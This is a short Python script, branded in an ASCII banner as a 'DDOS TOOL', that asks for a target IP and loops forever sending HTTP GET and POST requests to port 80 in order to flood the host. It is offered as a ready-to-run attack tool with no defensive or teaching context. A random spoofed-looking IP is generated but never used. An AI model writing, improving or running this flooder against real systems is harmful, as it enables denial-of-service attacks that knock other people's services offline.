import socket
import threading
import random

ascii_logo = """

███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██     DDOS TOOL / @h3art_exe | Lamer Qiz
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████

"""

target_ip = ""
target_port = 80
fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def http_get():
    global target_ip, target_port
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.send(f"GET / HTTP/1.1\r\nHost:{target_ip}\r\n\r\n".encode())
    sock.close()

def http_post():
    global target_ip, target_port, fake_ip
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    data = f"""POST / HTTP/1.1\r\nHost:{target_ip}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 7\r\nConnection: keep-alive\r\nReferer: http://{target_ip}/\r\nUpgrade-Insecure-Requests: 1\r\n\r\nparam1=value1"""
    sock.send(data.encode())
    sock.close()

def ddos_attack():
    global ascii_logo
    print(ascii_logo)
    print("Starting DDOS attack...")
    while True:
        http_get()
        http_post()


if __name__ == "__main__":
    target_ip = input("Enter the target IP address:")
    ddos_thread = threading.Thread(target=ddos_attack)
    ddos_thread.start()

